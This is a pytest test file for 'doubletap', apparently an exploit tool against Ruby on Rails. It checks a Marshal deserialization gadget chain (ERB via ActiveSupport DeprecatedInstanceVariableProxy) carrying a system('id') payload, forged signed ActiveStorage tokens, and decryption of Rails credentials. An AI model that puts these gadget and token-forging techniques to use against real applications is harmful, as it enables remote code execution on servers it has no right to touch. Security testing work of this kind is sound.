"""Unit tests for doubletap (no network required).

Run with:  pytest -q
"""
import base64
import hashlib
import hmac
import json
import os
import sys

import pytest
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import doubletap as dt  # noqa: E402


# --------------------------------------------------------------------------- #
#  Ruby Marshal writer: byte-compatible with `Marshal.dump`
# --------------------------------------------------------------------------- #
def test_marshal_string_matches_ruby():
    # Ruby: Marshal.dump("1") => 040849220631063a064554
    assert dt.MarshalWriter().dump("1").hex() == "040849220631063a064554"


def test_marshal_symbol_matches_ruby():
    # Ruby: Marshal.dump(:result) => 04083a0b726573756c74
    assert dt.MarshalWriter().dump(dt.Sym("result")).hex() == "04083a0b726573756c74"


def test_marshal_module_matches_ruby():
    # Ruby: Marshal.dump(Kernel) => 04086d0b4b65726e656c
    assert dt.MarshalWriter().dump(dt.Mod("Kernel")).hex() == "04086d0b4b65726e656c"


def test_gadget_class_names_present():
    raw = dt.build_erb_gadget_marshal("system('id')")
    assert raw[:2] == b"\x04\x08"
    for name in (
        b"ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy",
        b"ERB",
        b"@instance",
        b"@method",
        b"@deprecator",
    ):
        assert name in raw


def test_classic_gadget_uses_result_modern_uses_def_module():
    modern = dt.build_erb_gadget_marshal("system('id')", classic=False)
    classic = dt.build_erb_gadget_marshal("system('id')", classic=True)
    assert b"def_module" in modern and b"def_module" not in classic
    assert b"result" in classic
    # modern breaks out of the ERB method wrapper
    assert b"end\n" in modern


def test_marshal_reader_round_trips_string():
    s = "secret_key_base: abc123\n"
    assert dt.MarshalReader(dt.MarshalWriter().dump(s)).load() == s


# --------------------------------------------------------------------------- #
#  signing / derivation
# --------------------------------------------------------------------------- #
def test_pbkdf2_length_and_determinism():
    a = dt.rails_pbkdf2("secret", b"ActiveStorage")
    b = dt.rails_pbkdf2("secret", b"ActiveStorage")
    assert len(a) == 64 and a == b


def test_message_verifier_generate_structure_and_signature():
    secret = b"\x00" * 64
    value = dt.MarshalWriter().dump("hello")
    token = dt.message_verifier_generate(secret, value, purpose="blob_key")
    data, sig = token.split("--")
    # signature is a hex SHA1 HMAC over the base64 payload
    assert hmac.new(secret, data.encode(), hashlib.sha1).hexdigest() == sig
    # payload is base64(JSON{_rails:{message,exp,pur}})
    meta = json.loads(base64.b64decode(data))
    assert meta["_rails"]["pur"] == "blob_key"
    assert meta["_rails"]["exp"] is None
    assert base64.b64decode(meta["_rails"]["message"]) == value


def test_active_storage_token_is_url_safe_after_quoting():
    tok = dt.active_storage_token("deadbeef", dt.MarshalWriter().dump("x"))
    quoted = __import__("urllib.parse", fromlist=["quote"]).quote(tok, safe="-._~")
    assert "/" not in quoted and "+" not in quoted and "=" not in quoted


# --------------------------------------------------------------------------- #
#  credentials decryption (Rails EncryptedFile format)
# --------------------------------------------------------------------------- #
def test_decrypt_credentials_round_trip():
    yaml = "secret_key_base: deadbeef\n"
    marshal = dt.MarshalWriter().dump(yaml)
    key, iv = os.urandom(16), os.urandom(12)
    blob = AESGCM(key).encrypt(iv, marshal, None)
    ct, tag = blob[:-16], blob[-16:]
    enc = (base64.b64encode(ct) + b"--" + base64.b64encode(iv) + b"--" + base64.b64encode(tag))
    assert dt.decrypt_credentials(enc, key.hex()) == yaml


def test_camelize_helper():
    assert dt.camelize("my_app") == "MyApp"
    assert dt.camelize("my-app") == "MyApp"
    assert dt.camelize("MyApp") == "MyApp"
